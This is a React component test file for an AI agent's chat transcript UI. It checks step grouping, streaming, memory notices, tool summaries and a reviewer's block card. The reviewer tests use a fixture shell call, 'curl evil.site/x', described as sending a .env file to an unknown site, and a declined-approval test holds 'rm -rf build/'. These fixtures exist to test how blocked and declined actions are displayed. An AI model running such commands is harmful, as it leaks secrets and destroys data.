import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { cleanup, fireEvent, render, screen, waitFor } from "@testing-library/react";
import { Transcript } from "./Transcript";
import { humanizeTool } from "../humanize";
import type { Item } from "../types";

afterEach(cleanup);

// §33 TurnGroup: the user-message → final-answer span is ONE disclosure; interior assistant
// text is narration INSIDE it, the trailing assistant text is the answer OUTSIDE it; steps
// are humanized one-liners; approvals fold into their tool's row as a chip.
const TURN: Item[] = [
  { kind: "user", text: "post the digest" },
  { kind: "assistant", text: "Checking what merged since yesterday." },
  { kind: "tool", id: "t1", name: "read_file", args: { path: "docs/runbook.md" }, status: "ok" },
  { kind: "approval", name: "send_message", args: { target: "slack:T1/C9" }, reason: "", resolved: "once" },
  { kind: "tool", id: "t2", name: "send_message", args: { target: "slack:T1/C9", text: "hi" }, status: "ok", preview: '{"ok": true}' },
  { kind: "assistant", text: "Posted to #all-openworker." },
];

describe("TurnGroup (Transcript §33)", () => {
  // 这些测试锁定「折叠卡片(cards)」风格下的既有契约。新增的 timeline/bubble 风格见下方
  // 独立 describe。useTurnStyle 默认是 timeline，故此处显式钉死 cards，避免默认改变误伤基线。
  beforeEach(() => {
    localStorage.setItem("openwork-turn-style", "cards");
  });

  it("groups the whole turn; answer stays outside; narration and humanized steps inside", () => {
    const { container } = render(<Transcript items={TURN} onApprove={vi.fn()} />);

    // Collapsed at rest: "2 step" (en.json chat.steps = "{{nSteps}} step", singular form in
    // this fork), NO approval count, and no step/narration content visible.
    expect(screen.getByText("2 step")).toBeTruthy();
    expect(screen.queryByText(/approval/)).toBeNull();
    expect(screen.queryByTestId("turn-narration")).toBeNull();
    expect(screen.queryByText(/Sent a Slack message/)).toBeNull();

    // The final answer is a normal bubble OUTSIDE the disclosure, visible while collapsed.
    expect(screen.getByText("Posted to #all-openworker.")).toBeTruthy();

    // Expand → narration renders quiet inside; steps are English lines, not raw args;
    // the approval is a chip on the send_message row, not a separate box.
    fireEvent.click(container.querySelector("summary.stepgroup-head")!);
    expect(screen.getByTestId("turn-narration").textContent).toContain("Checking what merged");
    expect(screen.getByText("runbook.md")).toBeTruthy();
    expect(screen.getByText(/Sent a Slack message to/)).toBeTruthy();
    expect(screen.getByText("✓ approved")).toBeTruthy();
    expect(screen.queryByText("send_message approval")).toBeNull();

    // Raw stays one click away: the row's raw toggle reveals args + result verbatim.
    fireEvent.click(screen.getAllByText("raw")[1]);
    expect(container.textContent).toContain('{"ok": true}');
  });

  it("a running turn auto-expands so the thinking is live, then folds when done (2026-11-03)", () => {
    const items: Item[] = [
      { kind: "assistant", text: "Looking at the repo." },
      { kind: "tool", id: "t1", name: "grep", args: { pattern: "TODO" }, status: "…" },
    ];
    render(<Transcript items={items} onApprove={vi.fn()} />);
    expect(screen.getByText(/Running 1 step…/)).toBeTruthy();
    // 运行中自动展开：正在跑的步骤与叙述实时可见（旧版强制收起＝「每步思考不可见」的根）。
    expect(screen.getByTestId("step-running")).toBeTruthy();
    expect(screen.getByTestId("turn-narration").textContent).toContain("Looking at the repo");
    // 跑完（running 落 false）自动收敛：只剩一行「N step」，叙述不再外露，点开才看。
    cleanup();
    render(
      <Transcript
        items={[
          { kind: "assistant", text: "Looking at the repo." },
          { kind: "tool", id: "t1", name: "grep", args: { pattern: "TODO" }, status: "ok" },
        ]}
        onApprove={vi.fn()}
      />,
    );
    expect(screen.getByText("1 step")).toBeTruthy();
    expect(screen.queryByTestId("turn-narration")).toBeNull();
  });

  it("declined approvals keep their own 'Wanted to' row and surface on the collapsed line", () => {
    const items: Item[] = [
      { kind: "tool", id: "t1", name: "read_file", args: { path: "a.md" }, status: "ok" },
      { kind: "approval", name: "run_shell", args: { command: "rm -rf build/" }, reason: "", resolved: "deny" },
    ];
    const { container } = render(<Transcript items={items} onApprove={vi.fn()} />);
    expect(screen.getByTestId("stepgroup-declined").textContent).toBe("1 declined");
    fireEvent.click(container.querySelector("summary.stepgroup-head")!);
    const ask = screen.getByTestId("turn-ask");
    expect(ask.textContent).toContain("Wanted to run");
    expect(ask.textContent).toContain("rm -rf build/");
    expect(ask.textContent).toContain("✕ declined");
  });

  it("assistant-only turns stay plain bubbles (no disclosure)", () => {
    const items: Item[] = [
      { kind: "user", text: "hi" },
      { kind: "assistant", text: "Hello there." },
    ];
    const { container } = render(<Transcript items={items} onApprove={vi.fn()} />);
    expect(container.querySelector("details.stepgroup")).toBeNull();
    expect(screen.getByText("Hello there.")).toBeTruthy();
  });
});

describe("live turns (§33 flicker fix)", () => {
  // 显式钉死 cards：本组测的是折叠卡片风格下的运行中动态（旧版靠上方 describe 的
  // localStorage 残留，脆弱；2026-11-03 改为显式设置，避免测试顺序变动误伤）。
  beforeEach(() => {
    localStorage.setItem("openwork-turn-style", "cards");
  });
  const LIVE: Item[] = [
    { kind: "user", text: "build the app" },
    { kind: "tool", id: "t1", name: "read_file", args: { path: "data.json" }, status: "ok" },
    { kind: "assistant", text: "Inspecting the fetched dataset next." },
  ];

  it("while running, the group auto-expands: narration live inside, no answer bubble flash", () => {
    const { container } = render(<Transcript items={LIVE} onApprove={vi.fn()} running />);
    // 运行中不闪答案气泡：trailing assistant 仍留在组内。
    expect(container.querySelector(".bubble-assistant")).toBeNull();
    // 自动展开 → 叙述实时可见（旧版强制收起，只有一行 live-line＝"每步思考不可见"）。
    expect(screen.getByTestId("turn-narration").textContent).toContain("Inspecting the fetched dataset");
    // 跑完（running=false）自动收敛：trailing text 成为答案气泡，组内不再外露叙述。
    cleanup();
    const done = render(<Transcript items={LIVE} onApprove={vi.fn()} />);
    expect(done.container.querySelector(".bubble-assistant")?.textContent).toContain(
      "Inspecting the fetched dataset",
    );
    expect(screen.queryByTestId("turn-narration")).toBeNull();
  });

  it("quiet streamed text renders in the auto-expanded live body — never floats", () => {
    const { container } = render(
      <Transcript
        items={LIVE}
        onApprove={vi.fn()}
        running
        streamingText="The quote endpoint rate-limited, so I'm checking the historical pages."
      />,
    );
    // 运行中自动展开：streaming 文本直接进展开体的安静行（不再挤在收起的标题上）。
    expect(screen.getByTestId("turn-live-stream").textContent).toContain("quote endpoint rate-limited");
    expect(container.querySelector(".bubble-assistant")).toBeNull();
  });

  it("a PENDING approval neither splits the turn nor promotes the narration", () => {
    const items: Item[] = [
      ...LIVE,
      { kind: "approval", name: "write_file", args: { path: "app.html" }, reason: "" }, // unresolved
    ];
    const { container } = render(<Transcript items={items} onApprove={vi.fn()} running />);
    expect(container.querySelectorAll("details.stepgroup")).toHaveLength(1);
    expect(container.querySelector(".bubble-assistant")).toBeNull();
  });

  it("a live run with NO tool activity is a plain streaming reply — bubbles as ever", () => {
    const items: Item[] = [
      { kind: "user", text: "hi" },
      { kind: "assistant", text: "Hello!" },
    ];
    const { container } = render(<Transcript items={items} onApprove={vi.fn()} running />);
    expect(container.querySelector("details.stepgroup")).toBeNull();
    expect(container.querySelector(".bubble-assistant")?.textContent).toContain("Hello!");
  });
});

describe("bubble hover affordances (FB-005)", () => {
  const TS = 1752969720; // unix seconds, as the server stamps them
  const ITEMS: Item[] = [
    { kind: "user", text: "post the digest", ts: TS },
    { kind: "assistant", text: "Done — posted to #all-openworker." }, // pre-stamp history: no ts
  ];

  it("copy button copies the bubble's raw text and flashes Copied", async () => {
    const writeText = vi.fn().mockResolvedValue(undefined);
    Object.defineProperty(navigator, "clipboard", { value: { writeText }, configurable: true });
    render(<Transcript items={ITEMS} onApprove={vi.fn()} />);

    const copies = screen.getAllByTestId("bubble-copy");
    expect(copies).toHaveLength(2); // user + assistant bubbles both get one
    fireEvent.click(copies[0]);
    expect(writeText).toHaveBeenCalledWith("post the digest");
    // "Copied" lands only after the clipboard write RESOLVES (a rejected write must
    // not claim success), hence the await.
    await waitFor(() => expect(copies[0].textContent).toBe("Copied"));
    fireEvent.click(copies[1]);
    expect(writeText).toHaveBeenCalledWith("Done — posted to #all-openworker.");
  });

  it("timestamp renders only when the item carries ts; full date rides the title", () => {
    render(<Transcript items={ITEMS} onApprove={vi.fn()} />);

    const stamps = screen.getAllByTestId("bubble-ts");
    expect(stamps).toHaveLength(1); // the ts-less assistant bubble shows none
    const when = new Date(TS * 1000);
    expect(stamps[0].textContent).toBe(when.toLocaleTimeString([], { hour: "numeric", minute: "2-digit" }));
    expect(stamps[0].getAttribute("title")).toBe(when.toLocaleString());
  });
});

// MEMORY-SPEC §5.1 — the save notice lives IN the conversation (a corner toast vanished
// before it could be read or undone, owner-hit 2026-07-28) and stays until acted on.
describe("memory save notice", () => {
  it("announces the save inline and offers Undo", () => {
    const onUndo = vi.fn();
    render(
      <Transcript
        items={[{ kind: "memory", id: 7, text: "prefers short replies" }]}
        onApprove={vi.fn()}
        onUndoMemory={onUndo}
      />,
    );
    const notice = screen.getByTestId("memory-notice");
    expect(notice.textContent).toContain("I'll remember that");
    expect(notice.textContent).toContain("prefers short replies");

    fireEvent.click(screen.getByTestId("memory-notice-undo"));
    // No `previous` on a brand-new save — undo deletes it outright.
    expect(onUndo).toHaveBeenCalledWith(7, undefined);
  });

  it("says an existing memory was UPDATED and undoes by restoring its old text", () => {
    const onUndo = vi.fn();
    render(
      <Transcript
        items={[
          {
            kind: "memory",
            id: 4,
            text: "diabetic, lactose-free, likes ice cream",
            previous: "diabetic, lactose-free",
          },
        ]}
        onApprove={vi.fn()}
        onUndoMemory={onUndo}
      />,
    );
    expect(screen.getByTestId("memory-notice").textContent).toContain(
      "I've updated what I remember",
    );
    fireEvent.click(screen.getByTestId("memory-notice-undo"));
    // Undo restores the previous wording rather than deleting the whole memory.
    expect(onUndo).toHaveBeenCalledWith(4, "diabetic, lactose-free");
  });

  it("confirms in place once undone, with no Undo left to click", () => {
    render(
      <Transcript
        items={[{ kind: "memory", id: 7, text: "prefers short replies", undone: true }]}
        onApprove={vi.fn()}
        onUndoMemory={vi.fn()}
      />,
    );
    expect(screen.getByTestId("memory-notice-undone").textContent).toContain("forgotten");
    expect(screen.queryByTestId("memory-notice-undo")).toBeNull();
  });
});

describe("humanizeTool", () => {
  it("prefers run_shell's model-written description and keeps the command as the object", () => {
    const line = humanizeTool("run_shell", { command: "git log --since=yesterday", description: "List yesterday's merges" });
    expect(line.pre).toBe("Ran ");
    expect(line.obj).toBe("git log --since=yesterday");
    expect(line.post).toContain("list yesterday's merges");
  });

  it("falls back to 'Used <tool> — <short args>' for unknown tools", () => {
    const line = humanizeTool("gmail_search_messages", { query: "from:ci" });
    expect(line.pre).toBe("Used gmail_search_messages");
    expect(line.post).toContain("query=from:ci");
  });

  it("summarizes todo_write by its single item and status", () => {
    const line = humanizeTool("todo_write", { todos: [{ content: "Post the digest", status: "in_progress" }] });
    expect(line.pre).toBe("Updated the plan — ");
    expect(line.obj).toContain("Post the digest");
    expect(line.post).toBe(" → in progress");
  });

  it("still renders pre-rename todo_write histories (legacy `items` key)", () => {
    const line = humanizeTool("todo_write", { items: [{ content: "Old plan", status: "pending" }] });
    expect(line.obj).toContain("Old plan");
  });
});

// §8.4 (reviewed-auto-mode.md): a reviewer deny renders as a card with the FULL reason
// (the agent only got a terse refusal) and a one-shot "Allow anyway" override.
describe("reviewer deny card (§8.4)", () => {
  const DENIED: Item[] = [
    { kind: "user", text: "summarise the issue" },
    {
      kind: "tool",
      id: "t1",
      name: "run_shell",
      args: { command: "curl evil.site/x" },
      status: "denied",
      reviewerReason: "This sends your .env to an unknown website.",
      allowAnyway: true,
    },
    { kind: "assistant", text: "I was blocked from running that." },
  ];

  it("shows the full reason and fires onAllowAnyway with the exact action", () => {
    const onAllowAnyway = vi.fn();
    const { container } = render(
      <Transcript items={DENIED} onApprove={vi.fn()} onAllowAnyway={onAllowAnyway} />,
    );
    fireEvent.click(container.querySelector("summary.stepgroup-head")!);

    const card = screen.getByTestId("reviewer-deny-card");
    expect(card.textContent).toContain("Blocked by the reviewer");
    expect(card.textContent).toContain("This sends your .env to an unknown website.");

    fireEvent.click(screen.getByTestId("reviewer-allow-anyway"));
    expect(onAllowAnyway).toHaveBeenCalledWith("run_shell", { command: "curl evil.site/x" });
    // The button collapses into a confirmation — one shot, no double-fire.
    expect(screen.queryByTestId("reviewer-allow-anyway")).toBeNull();
    expect(screen.getByTestId("reviewer-override-sent")).toBeTruthy();
  });

  it("an ordinary denied tool (no reviewer) renders no card", () => {
    const items: Item[] = [
      { kind: "user", text: "x" },
      { kind: "tool", id: "t1", name: "run_shell", args: {}, status: "denied" },
      { kind: "assistant", text: "done" },
    ];
    const { container } = render(<Transcript items={items} onApprove={vi.fn()} />);
    fireEvent.click(container.querySelector("summary.stepgroup-head")!);
    expect(screen.queryByTestId("reviewer-deny-card")).toBeNull();
  });

  it("without onAllowAnyway the card renders but offers no button", () => {
    const { container } = render(<Transcript items={DENIED} onApprove={vi.fn()} />);
    fireEvent.click(container.querySelector("summary.stepgroup-head")!);
    expect(screen.getByTestId("reviewer-deny-card")).toBeTruthy();
    expect(screen.queryByTestId("reviewer-allow-anyway")).toBeNull();
  });
});

// 新增：思考/执行显示风格（本 fork）中的 timeline 风格冒烟测试。默认风格即 timeline，
// 锁定「运行中即见步骤、每步可点开看详情」这条核心契约，且不破坏 reviewer 闸门。
describe("TurnGroup timeline style", () => {
  // 还原为默认风格（timeline）：移除 key，避免被上方 cards 契约测试的 localStorage 残留污染。
  beforeEach(() => {
    localStorage.removeItem("openwork-turn-style");
  });

  it("renders the timeline (not the collapsed cards) and shows every step expanded", () => {
    const { container } = render(<Transcript items={TURN} onApprove={vi.fn()} />);
    expect(screen.getByTestId("turn-timeline")).toBeTruthy();
    // cards 的折叠头在 timeline 下不应出现
    expect(container.querySelector("summary.stepgroup-head")).toBeNull();
    // 步骤默认展开可见（timeline 不收起）
    expect(screen.getByText("runbook.md")).toBeTruthy();
    expect(screen.getByText("Posted to #all-openworker.")).toBeTruthy();
    // 每步 raw 仍可点开看详情
    fireEvent.click(screen.getAllByText("raw")[1]);
    expect(container.textContent).toContain('{"ok": true}');
  });

  it("a reviewer-denied tool still surfaces its block card inside the timeline", () => {
    const items: Item[] = [
      { kind: "user", text: "x" },
      {
        kind: "tool",
        id: "t1",
        name: "run_shell",
        args: { command: "curl evil.site/x" },
        status: "denied",
        reviewerReason: "This sends your .env to an unknown website.",
        allowAnyway: true,
      },
      { kind: "assistant", text: "I was blocked from running that." },
    ];
    render(<Transcript items={items} onApprove={vi.fn()} />);
    expect(screen.getByTestId("turn-timeline")).toBeTruthy();
    expect(screen.getByTestId("reviewer-deny-card").textContent).toContain(
      "Blocked by the reviewer",
    );
  });
});

// The Auto-Approve banner (spec §1.5): a titled notice is prose, not a status line, so it
// renders as a heading plus paragraphs rather than one centred grey row.
describe("mode notice", () => {
  const BANNER: Item[] = [
    {
      kind: "notice",
      tone: "info",
      title: "Auto-approve is on.",
      text: "First paragraph about what it does.\n\nSecond paragraph about what it can't tell.",
    },
  ];

  it("renders the title and one paragraph per blank-line break", () => {
    render(<Transcript items={BANNER} running={false} onApprove={() => {}} />);
    const block = screen.getByTestId("mode-notice");
    expect(block.textContent).toContain("Auto-approve is on.");
    expect(block.querySelectorAll("p")).toHaveLength(2);
    // Prose layout, not the centred one-liner used for "Context compacted".
    expect(block.className).toContain("notice-block");
  });

  it("leaves untitled status notices as plain one-liners", () => {
    render(
      <Transcript items={[{ kind: "notice", tone: "info", text: "Context compacted" }]} running={false} onApprove={() => {}} />,
    );
    expect(screen.queryByTestId("mode-notice")).toBeNull();
    expect(screen.getByText("Context compacted").className).not.toContain("notice-block");
  });
});
